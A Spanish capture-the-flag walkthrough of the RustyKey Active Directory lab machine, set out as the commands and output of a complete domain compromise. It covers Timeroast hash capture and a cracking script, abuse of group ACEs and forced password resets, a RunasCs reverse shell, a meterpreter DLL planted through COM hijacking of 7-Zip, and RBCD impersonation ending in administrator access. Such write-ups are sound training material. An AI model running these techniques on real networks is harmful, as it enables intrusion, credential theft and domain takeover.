# Context

>As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: `rr.parker:8#t5HE8L!W3A`

# Enumeration

>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.10.11.75
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 04:21 EDT
Nmap scan report for 10.10.11.75
Host is up (0.064s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 16:21:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.85 seconds
```

>Vemos que la máquina tiene NTLM deshabilitado al tratar de autenticarnos por NTLM usando netexec:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ nxc smb 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A'                    
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.75     445    10.10.11.75      [-] 10.10.11.75\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED 
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ echo "10.10.11.75 rustykey.htb DC.rustykey.htb" >> /etc/hosts
```

>Modificamos el realm de Kerberos en `/etc/krb5.conf` para emplear autenticación por Kerberos en lugar de NTLM:

```bash
[libdefaults]
  default_realm = rustykey.htb

[realms]
  RUSTYKEY.HTB = {
    kdc = DC.RUSTYKEY.HTB:88
    admin_serve = DC.RUSTYKEY.HTB
    default_domain = RUSTYKEY.HTB
  }

[domain_realm]
    .rustykey.htb = rustykey.htb
    rustykey.htb = rustykey.htb
```

>Ahora sincronizaremos nuestra hora con el DC para poder pedir el TGT empleando el protocolo NTP:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ sudo ntpdate 10.10.11.75                                       
2025-10-15 12:27:14.361467 (-0400) +28801.691703 +/- 0.031732 10.10.11.75 s1 no-leap
CLOCK: time stepped by 28801.691703
```

>Pedimos el TGT del usuario `rr.parker` y lo cargamos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-getTGT 'rustykey.htb/rr.parker:8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ export KRB5CCNAME=rr.parker.ccache
```

>Ahora nos podemos autenticar como el usuario `rr.parker`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k         
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

>Obtenemos archivos analizables por `bloodhound` empleando el ticket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodhound-ce-python -u rr.parker -k -no-pass -ns 10.10.11.75 -d rustykey.htb -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: rustykey.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 12S
```

>Vamos a intentar hacer un ataque `Timeroast` que nos permite abusar el servicio `NTP` para que nos de hashes de las contraseñas de los usuarios de máquinas del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ sudo nxc smb 10.10.11.75 -M timeroast
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
TIMEROAST   10.10.11.75     445    10.10.11.75      [*] Starting Timeroasting...
TIMEROAST   10.10.11.75     445    10.10.11.75      1000:$sntp-ms$f7636bf20187f5e88cec25181f6f771d$1c0111e900000000000a328b4c4f434cec9a0b996152fc26e1b8428bffbfcd0aec9a4e3cb9633e93ec9a4e3cb9636f3b
TIMEROAST   10.10.11.75     445    10.10.11.75      1106:$sntp-ms$34c8479ac6f89729833bf1874c786c64$1c0111e900000000000a328c4c4f434cec9a0b99615836f8e1b8428bffbfcd0aec9a4e3d6947a5b0ec9a4e3d6947e8cc
TIMEROAST   10.10.11.75     445    10.10.11.75      1103:$sntp-ms$a7cb7fc0eb7fa9cee3334a37de78a1cf$1c0111e900000000000a328c4c4f434cec9a0b99604c3994e1b8428bffbfcd0aec9a4e3d6464aed6ec9a4e3d6464dc22
TIMEROAST   10.10.11.75     445    10.10.11.75      1104:$sntp-ms$8fce1ddfc9af66e7f00e30c640b9f231$1c0111e900000000000a328c4c4f434cec9a0b9961d4f9c1e1b8428bffbfcd0aec9a4e3d65ed684dec9a4e3d65eda158
TIMEROAST   10.10.11.75     445    10.10.11.75      1105:$sntp-ms$9d49357aa1be8f6ec84c86d6a6db5721$1c0111e900000000000a328c4c4f434cec9a0b995fc8f67ee1b8428bffbfcd0aec9a4e3d67b86becec9a4e3d67b8a852
TIMEROAST   10.10.11.75     445    10.10.11.75      1107:$sntp-ms$7351fe05d53d4282abb761503221f10e$1c0111e900000000000a328c4c4f434cec9a0b99631c1e43e1b8428bffbfcd0aec9a4e3d6b0b93b1ec9a4e3d6b0bd017
TIMEROAST   10.10.11.75     445    10.10.11.75      1119:$sntp-ms$b2cf3e3ad8bc89e71faec6e228497532$1c0111e900000000000a328c4c4f434cec9a0b996003eea2e1b8428bffbfcd0aec9a4e3d7c2cd042ec9a4e3d7c2cee75
TIMEROAST   10.10.11.75     445    10.10.11.75      1120:$sntp-ms$44330a7f5fdcb64711df9a00188f7f9a$1c0111e900000000000a328c4c4f434cec9a0b996040e31fe1b8428bffbfcd0aec9a4e3d7c69b3f8ec9a4e3d7c69e9a8
TIMEROAST   10.10.11.75     445    10.10.11.75      1121:$sntp-ms$5728ce7fc30a622569c7fa5857cfc63a$1c0111e900000000000a328c4c4f434cec9a0b9960418ae4e1b8428bffbfcd0aec9a4e3d7c6a6fe0ec9a4e3d7c6a8fc0
TIMEROAST   10.10.11.75     445    10.10.11.75      1118:$sntp-ms$54bc97a5a36048e440bc9e80bf73c827$1c0111e900000000000a328c4c4f434cec9a0b996002f4a7e1b8428bffbfcd0aec9a4e3d7c2bc72eec9a4e3d7c2bfb30
TIMEROAST   10.10.11.75     445    10.10.11.75      1122:$sntp-ms$ae8a4b936c8565e81e0e1ac8bd7e2406$1c0111e900000000000a328c4c4f434cec9a0b996069b24be1b8428bffbfcd0aec9a4e3d7c928324ec9a4e3d7c92b727
TIMEROAST   10.10.11.75     445    10.10.11.75      1123:$sntp-ms$1089fb7aa85ec262fe735df35db7f255$1c0111e900000000000a328c4c4f434cec9a0b995f88806ce1b8428bffbfcd0aec9a4e3d7f884fc5ec9a4e3d7f889997            
TIMEROAST   10.10.11.75     445    10.10.11.75      1124:$sntp-ms$ab077893c73ac021a2879958fe38a802$1c0111e900000000000a328c4c4f434cec9a0b995fc42203e1b8428bffbfcd0aec9a4e3d7fc3fec7ec9a4e3d7fc42f6f
TIMEROAST   10.10.11.75     445    10.10.11.75      1125:$sntp-ms$3f475c99c18594bcd8fc9396f0caffd8$1c0111e900000000000a328c4c4f434cec9a0b996194f418e1b8428bffbfcd0aec9a4e3d8194bcbbec9a4e3d81950b95
TIMEROAST   10.10.11.75     445    10.10.11.75      1126:$sntp-ms$961ff090d7679bcef8808d1af7511b56$1c0111e900000000000a328c4c4f434cec9a0b9963180255e1b8428bffbfcd0aec9a4e3d8317df19ec9a4e3d8318131c
TIMEROAST   10.10.11.75     445    10.10.11.75      1127:$sntp-ms$7c53a8adb5179528dafdb5645f61a302$1c0111e900000000000a328c4c4f434cec9a0b9960c95dace1b8428bffbfcd0aec9a4e3d84e1c3d4ec9a4e3d84e20543
```

>De aquí nos interesa la que comienza por el `RID 1125` ya que posee la ACE `AddSelf` sobre un grupo interesante:

<img width="1394" height="412" alt="image" src="https://github.com/user-attachments/assets/5f9bac59-9edd-4277-b1e3-1583f7b431ed" />

>Usaremos el siguiente script para crackear el hash pero lo modificaremos de la siguiente forma para que no de errores de encoding: https://raw.githubusercontent.com/SecuraBV/Timeroast/refs/heads/main/extra-scripts/timecrack.py

```python
#!/usr/bin/env python3
"""Perform a simple dictionary attack against the output of timeroast.py."""
from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'

def md4(data : bytes) -> bytes:
  try:
    return hashlib.new('md4', data).digest()
  except ValueError:
    from md4 import MD4
    return MD4(data).bytes()

def compute_hash(password : str, salt : bytes) -> bytes:
  """Compute a legacy NTP authenticator 'hash'."""
  return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
    
def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
  hashes = []
  for line in hashfile:
    line = line.strip()
    if line:
      m = re.match(HASH_FORMAT, line)
      if not m:
        print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
        sys.exit(1)
      rid, hashval, salt = m.group('rid', 'hashval', 'salt')
      hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
  
  for password in dictfile:
    password = password.strip()
    for rid, hashval, salt in hashes:
      if compute_hash(password, salt) == hashval:
        yield rid, password

def main():
  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py.""")
  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
  # FIX: Use latin-1 encoding for dictionary
  argparser.add_argument('dictionary', type=lambda f: open(f, encoding='latin-1'), 
                        help='Line-delimited password dictionary')
  args = argparser.parse_args()
  
  crackcount = 0
  for rid, password in try_crack(args.hashes, args.dictionary):
    print(f'[+] Cracked RID {rid} password: {password}')
    crackcount += 1
  print(f'\n{crackcount} passwords recovered.')

if __name__ == '__main__':
  main()
```

>Conseguimos las credenciales: `IT-COMPUTER3$:Rusty88!`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ python3 timecrack.py IT-computer_hash /usr/share/wordlists/rockyou.txt
[+] Cracked RID 1125 password: Rusty88!

1 passwords recovered.
```

>Pedimos el TGT de la cuenta y lo cargamos en memoria:

```bash 
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-getTGT 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IT-COMPUTER3$.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ export KRB5CCNAME=IT-COMPUTER3\$.ccache
```

>Ahora vamos a explotar la ACE `AddSelf` que posee sobre el grupo `Helpdesk` para unirnos a ese grupo:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

>Vemos que este grupo posee varias ACE sobre diferentes usuarios y grupos:

<img width="849" height="457" alt="image" src="https://github.com/user-attachments/assets/959a6d7e-6710-49e7-a834-1e2a3318c688" />

>Vemos que de esos usuarios, `ee.reed` pertenece al grupo `Remote Management Users` lo que nos permitiría ganar acceso al DC mediante el protocolo `WinRM`:

<img width="1121" height="242" alt="image" src="https://github.com/user-attachments/assets/7277c739-22c7-4920-b3b9-5bc7b8d5837f" />

>Además pertenece al grupo `Protected Users` que podría no permitirnos realizar ningún cambio de credenciales así que vamos a `sacarlo de ahí`:

<img width="1461" height="466" alt="image" src="https://github.com/user-attachments/assets/5a5eb330-5d49-4521-a761-cf1bb4572f9a" />

>Vamos a sacar del grupo a los dos grupos siguientes `IT` y `Support`:

<img width="931" height="166" alt="image" src="https://github.com/user-attachments/assets/8182c364-d065-4468-b545-38af86fe2c98" />

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
[-] IT removed from Protected Objects
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' remove groupMember 'Protected Objects' 'Support'
[-] Support removed from Protected Objects
```

>Ahora podemos modificarle la contraseña a los 3 usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' set password 'bb.morgan' 'Password123$!'
[+] Password changed successfully!
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' set password 'gg.anderson' 'Password123$!'
[+] Password changed successfully!
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ bloodyAD --host dc.rustykey.htb -u 'IT-COMPUTER3$' -k -d rustykey.htb -p 'Rusty88!' set password 'ee.reed' 'Password123$!'
[+] Password changed successfully!
```

>Vamos a pedir el TGT de un usuario de cada grupo (`IT` y `Support`):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-getTGT 'rustykey.htb/bb.morgan:Password123$!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in bb.morgan.ccache
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-getTGT 'rustykey.htb/ee.reed:Password123$!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ee.reed.ccache
```

>Cargamos la de `bb.morgan` y entramos por `WinRM` al DC leyendo la user flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ export KRB5CCNAME=bb.morgan.ccache      
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ evil-winrm -i dc.rustykey.htb -r rustykey.htb                                                 
                                        
<SNIP>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> cat user.txt
6779a2cae85be51b445320f903cd87df
```

>Además, en el escritorio de `bb.morgan` vemos el siguiente archivo `PDF`:

<img width="591" height="696" alt="image" src="https://github.com/user-attachments/assets/451a24df-1b12-48be-a51c-aa1f4ea4291f" />

>Por lo que vemos, esto nos suscita a emplear al usuario `ee.reed` para escalar privilegios así que vamos a emplear `RunasCs.exe` para enviarnos una `reverse shell` como dicho usuario a nuestra máquina atacante:

```bash
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> upload ../../academy_tools/RunasCs.exe
                                        
Info: Uploading /home/kali/Desktop/machines/rustykey/../../academy_tools/RunasCs.exe to C:\Users\bb.morgan\Desktop\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> .\RunasCs.exe ee.reed Password123$! powershell.exe -r 10.10.15.71:443
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1a78c4a$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7800 created in background.
```

```
┌──(kali㉿jbkira)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.15.71] from (UNKNOWN) [10.10.11.75] 59292
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
rustykey\ee.reed
```

>Aquí tras enumerar, vemos que `7zip` se encuentra instalado con una `version vulnerable`:

```powershell
PS C:\Program Files\7-zip> cat readme.txt
cat readme.txt
7-Zip 24.08
-----------
<SNIP>
```

>Aunque si comprobamos su versión mediante powershell vemos que usa la `24.09` que está `parcheada`:

```powershell
PS C:\Program Files\7-zip> $version = (Get-Item "C:\Program Files\7-Zip\7z.exe").VersionInfo.ProductVersion
$version = (Get-Item "C:\Program Files\7-Zip\7z.exe").VersionInfo.ProductVersion
PS C:\Program Files\7-zip> Write-Host "7-Zip Version: $version"
Write-Host "7-Zip Version: $version"
7-Zip Version: 24.09
```

>Ahora vamos a emplear la herramienta de `sysinternals accesschk.exe` para ver nuestros permisos sobre el registro:

```bash
PS C:\Program Files\7-zip> C:\Temp\accesschk.exe -k -q -w "SUPPORT" HKCR\CLSID -accepteula
C:\Temp\accesschk.exe -k -q -w "SUPPORT" HKCR\CLSID -accepteula

Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}
```

>Aquí vemos que tenemos permisos de `lectura y escritura` sobre un registro `CLSID`, vamos a ver su path del DLL:

```powershell
PS C:\Program Files\7-zip> reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve
reg query "HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve

HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
```

>Ahora vamos a emplear `Get-Acl` para ver nuestros permisos sobre el `DLL` y vemos que tenemos `Full Control`:

```powershell
PS C:\Program Files\7-zip> Get-Acl "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select -ExpandProperty Access | Where-Object {$_.IdentityReference -like "*Support*"}
Get-Acl "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Select -ExpandProperty Access | Where-Object {$_.IdentityReference -like "*Support*"}


RegistryRights    : FullControl
AccessControlType : Allow
IdentityReference : RUSTYKEY\Support
IsInherited       : True
InheritanceFlags  : ContainerInherit
PropagationFlags  : None
```

>Comunmente, Windows al abrir el programa 7-Zip el `COM Loading` sería así:

```
# User opens .zip file in Explorer
# Windows needs archive handler
# Looks up 7-Zip CLSID: {23170F69-40C1-278A-1000-000100020000}
# Reads: HKCR\CLSID\{...}\InprocServer32\(Default) 
# Loads: "C:\Program Files\7-Zip\7-zip.dll"
# Calls: DllMain() in legitimate 7-zip.dll
```

>Si mediante `COM Hijacking` cambiamos ese `DLL`, podríamos hacer que se ejecute un `DLL malicioso` nuestro.

>Creamos el `DLL malicioso` que nos enviará una `reverse shell` con meterpreter:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.71 LPORT=4444 -f dll -o info.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: info.dll
```

>Ponemos en marcha el listener:

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.15.71
LHOST => 10.10.15.71
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.71:4444
```

>Tras subir el DLL malicioso a C:\Temp vamos a cambiar el `registro COM` para que se emplee nuestro DLL en lugar del legitimo:

```powershell
PS C:\Program Files\7-zip> reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\info.dll" /f
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\Temp\info.dll" /f
The operation completed successfully.
```

>Tras esperar un poco vemos que el DLL se ejecutó y recibimos una shell como `mm.turner`:

```bash
[*] Meterpreter session 1 opened (10.10.15.71:4444 -> 10.10.11.75:59378) at 2025-10-15 13:47:47 -0400

meterpreter > getuid
Server username: RUSTYKEY\mm.turner
```

>Vemos que el usuario posee la ACE `AllowedToAct` sobre el DC lo que nos permite efectuar un ataque `Resource-Based Constrained Delegation`:

<img width="740" height="231" alt="image" src="https://github.com/user-attachments/assets/46de1f44-c0f1-42a1-a2e6-35dadb43ee05" />

>Aquí vemos que `IT-Computer3` está `allowedToDelegate`:

```powershell
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    :
```

>Vamos a hacer que el usuario `IT-COMPUTER3$` pueda impersonar cualquier usuario mediante `RBCD`

```
PS C:\Windows> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
```

>Ahora, mediante `S4U2Self`, vamos a obtener un `TGS` para `impersonar` al usuario `backupadmin`:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-getST -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_DC.RUSTYKEY.HTB@RUSTYKEY.HTB.ccache
```

>Por último, empleando este ticket podemos iniciar sesión mediante `Wmiexec` y leer la flag final:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ export KRB5CCNAME=backupadmin@cifs_DC.RUSTYKEY.HTB@RUSTYKEY.HTB.ccache 
                                                                                                                                                                         
┌──(kali㉿jbkira)-[~/Desktop/machines/rustykey]
└─$ impacket-wmiexec -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\Users\Administrator\Desktop\root.txt
79662990c470f7113a1dc348906e82bc
```
